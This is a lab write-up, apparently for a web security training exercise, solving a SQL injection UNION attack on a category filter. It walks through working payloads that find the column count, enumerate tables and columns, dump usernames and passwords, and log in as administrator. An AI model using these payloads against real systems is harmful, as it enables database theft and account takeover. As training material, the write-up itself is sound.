## SQL injection UNION attack, retrieving multiple values in a single column

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

## Notes

- `/login`
- `/filter?category=parameter`

## Resume

1. Find the number of columns
2. Identify the reflected column
3. Enumerate database tables
4. Enumerate table columns
5. Dump usernames and passwords
6. Login as administrator

## Solve

First, determine the number of columns returned by the query.

Trying with one column :

```
' UNION ALL SELECT NULL-- -
```

returns :

```
Internal Server Error
```

Retrying with 2 columns :

```
' UNION ALL SELECT NULL,NULL-- -
```

works correctly, confirming that the query contains **2 columns**.

Next, determine which column reflects string data.

Trying :

```
' UNION ALL SELECT version(),NULL-- -
```

returns an error.

Retrying with :

```
' UNION ALL SELECT NULL,version()-- -
```

successfully displays :

```
PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
```

This confirms that the **second column** reflects string data.

Now enumerate database tables :

```
' UNION ALL SELECT NULL,table_name FROM information_schema.tables-- -
```

This reveals a table named :

```
users
```

The next step is to enumerate the columns from this table :

```
' UNION ALL SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'-- -
```

Returned columns :

- `username`
- `password`
- `email`

Now dump usernames :

```
' UNION ALL SELECT NULL,username FROM users-- -
```

Returned users :

- `administrator`
- `wiener`
- `carlos`

Then dump passwords :

```
' UNION ALL SELECT NULL,password FROM users-- -
```

Returned passwords :

```
yci9fvffz28kbp5v65cv
lomfr9t0i1jzgem1zc4z
jx2w5pr7a5zbfoef0qqp
```

Administrator credentials :

```
administrator:yci9fvffz28kbp5v65cv
```

Login using these credentials to solve the lab.